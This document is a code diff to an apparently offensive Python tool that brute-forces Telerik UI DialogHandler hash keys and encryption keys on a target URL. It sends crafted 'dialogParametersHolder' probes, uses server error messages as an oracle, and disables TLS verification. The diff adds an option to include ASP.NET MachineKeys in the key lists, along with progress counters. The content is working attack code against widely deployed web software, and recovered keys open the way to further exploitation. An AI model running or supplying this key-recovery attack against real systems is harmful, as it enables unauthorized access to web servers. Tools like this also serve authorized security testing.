@@ -99,10 +99,19 @@ def main():
         help="Optionally set a custom user-agent",
     )
 
+    parser.add_argument(
+        "-m", "--machine-keys", help="Optionally include ASP.NET MachineKeys when loading keys", action="store_true"
+    )
+
     args = parser.parse_args()
 
     if not args.url:
         return
+
+    include_machinekeys_bool = False
+    if args.machine_keys:
+        include_machinekeys_bool = True
+        print("MachineKeys inclusion enabled. Bruteforcing will take SIGNIFICANTLY longer")
 
     proxies = None
     if args.proxy:
@@ -141,6 +150,8 @@ def main():
         print("Unexpected response encountered, aborting.")
         return
 
+    print("Target is a valid DialogHandler endpoint. Brute forcing Telerik Hash Key...")
+
     found_hash_key = False
     found_encryption_key = False
     x = Telerik_HashKey()
@@ -149,12 +160,17 @@ def main():
     # PBKDF1_MS MODE
     if key_derive_mode == "PBKDF1_MS":
 
-        print("Target is a valid DialogHandler endpoint. Brute forcing Telerik Hash Key...")
+        hashkey_counter = 0
+        for hash_key_probe, hash_key in x.hashkey_probe_generator(include_machinekeys=include_machinekeys_bool):
 
-        for hash_key_probe, hash_key in x.hashkey_probe_generator():
+            hashkey_counter += 1
             data = {"dialogParametersHolder": hash_key_probe}
             res = requests.post(args.url, data=data, proxies=proxies, headers=headers, verify=False)
             resp_body = urllib.parse.unquote(res.text)
+
+            if hashkey_counter % 1000 == 0:
+                print(f"Tested {str(hashkey_counter)} hash keys so far...")
+
             if "The input data is not a complete block" in resp_body:
                 print(f"Found matching hashkey! [{hash_key}]")
                 found_hash_key = True
@@ -169,11 +185,17 @@ def main():
 
         if found_hash_key:
             print("Since we found a valid hash key, we can check for known Telerik Encryption Keys")
+
+            encryptionkey_counter = 0
             for encryption_key_probe, encryption_key in y.encryptionkey_probe_generator(
-                hash_key, key_derive_mode, include_machinekeys=False
+                hash_key, key_derive_mode, include_machinekeys=include_machinekeys_bool
             ):
+                encryptionkey_counter += 1
                 data = {"dialogParametersHolder": encryption_key_probe}
                 res = requests.post(args.url, data=data, proxies=proxies, headers=headers, verify=False)
+
+                if encryptionkey_counter % 1000 == 0:
+                    print(f"Tested {str(encryptionkey_counter)} encryption keys so far...")
                 if "Index was outside the bounds of the array" in res.text:
                     print(f"Found Encryption key! [{encryption_key}]")
                     found_encryption_key = True
@@ -187,12 +209,18 @@ def main():
             return
 
     elif key_derive_mode == "PBKDF2":
-
-        for hash_key in x.prepare_keylist(include_machinekeys=False):
+        if include_machinekeys_bool:
+            print(
+                "Warning: MachineKeys inclusion mode is enabled, which affects this Telerik version particularly dramatically. Brute Forcing will be VERY SLOW"
+            )
+            print("Try without the MachineKeys first!")
+        print("About to bruteforce hash key and encryption key combinations...")
+        count = 0
+        for hash_key in x.prepare_keylist(include_machinekeys=include_machinekeys_bool):
             for encryption_key_probe, encryption_key in y.encryptionkey_probe_generator(
-                hash_key, key_derive_mode, include_machinekeys=False
+                hash_key, key_derive_mode, include_machinekeys=include_machinekeys_bool
             ):
-
+                count += 1
                 data = {"dialogParametersHolder": encryption_key_probe}
                 res = requests.post(args.url, data=data, proxies=proxies, headers=headers, verify=False)
                 if "Index was outside the bounds of the array" in res.text:
@@ -201,6 +229,8 @@ def main():
                     found_hash_key = True
                     found_encryption_key = True
                     break
+                if count % 1000 == 0:
+                    print(f"Tested {str(count)} hash key / encryption key combinations so far...")
 
             if found_hash_key:
                 break
